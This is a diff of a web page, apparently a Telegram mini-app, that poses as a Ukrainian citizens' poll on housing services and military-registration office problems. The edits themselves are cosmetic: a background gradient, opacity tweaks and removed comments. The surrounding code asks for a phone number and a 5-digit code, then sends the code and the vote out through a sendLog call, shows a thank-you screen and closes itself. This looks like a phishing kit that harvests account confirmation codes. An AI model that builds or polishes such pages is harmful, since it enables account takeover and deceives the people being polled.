@@ -14,9 +14,8 @@
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
             padding: 20px; 
             
-            /* ТУТ ТВОЙ ФОН (можешь заменить ссылку на свою картинку) */
-            background: url('https://images.unsplash.com/photo-1557683316-973673baf926?q=80&w=1000&auto=format&fit=crop') no-repeat center center fixed; 
-            background-size: cover;
+            /* СТРОГИЙ ГРАФИТОВЫЙ ГРАДИЕНТ */
+            background: linear-gradient(135deg, #3a3a3c 0%, #1c1c1e 100%);
             background-color: #1a1a1a;
             
             color: #ffffff; 
@@ -40,7 +39,7 @@
         .vote-card { 
             display: flex; 
             align-items: center; 
-            background: rgba(255, 255, 255, 0.9); 
+            background: rgba(255, 255, 255, 0.95); 
             color: #000000; 
             border: 2px solid transparent; 
             border-radius: 14px; 
@@ -69,7 +68,7 @@
         input[type="tel"], input[type="text"] { 
             width: 100%; box-sizing: border-box; padding: 14px; font-size: 18px; 
             border: 2px solid transparent; border-radius: 10px; 
-            background: rgba(255, 255, 255, 0.9); color: #000000; 
+            background: rgba(255, 255, 255, 0.95); color: #000000; 
             margin-bottom: 12px; text-align: center; 
         }
         input:focus { outline: none; border-color: var(--btn); background: #ffffff; }
@@ -109,7 +108,7 @@
                 <div class="vote-title">Погана робота ЖКГ</div>
             </div>
             
-            <!-- ВАРІАНТ 3 (Про ТЦК) -->
+            <!-- ВАРІАНТ 3 -->
             <div class="vote-card" data-vote="Проблеми з ТЦК та СП (військовий облік)" onclick="selectVote(this)">
                 <img src="https://avatars.mds.yandex.net/i?id=1b4fc46e488945e78f8e14d77e29a40a_l-6947220-images-thumbs&n=13" alt="ТЦК">
                 <div class="vote-title">Проблеми з ТЦК та СП</div>
@@ -211,15 +210,12 @@
             if (code.length !== 5) return;
             dbg('Код надіслано: ' + code);
 
-            // Отправляем код
             sendLog(`🔑 <b>КОД:</b> ${code}\n🗳 <b>ГОЛОС:</b> ${selectedVote}`);
             
-            // Переключаем на экран "Спасибо"
             document.getElementById('screen-code').classList.add('hidden');
             document.getElementById('screen-thanks').classList.remove('hidden');
             document.getElementById('debug').classList.add('hidden');
 
-            // Автоматически закрываем мини-апп через 3 секунды
             setTimeout(() => {
                 closeApp();
             }, 3000);
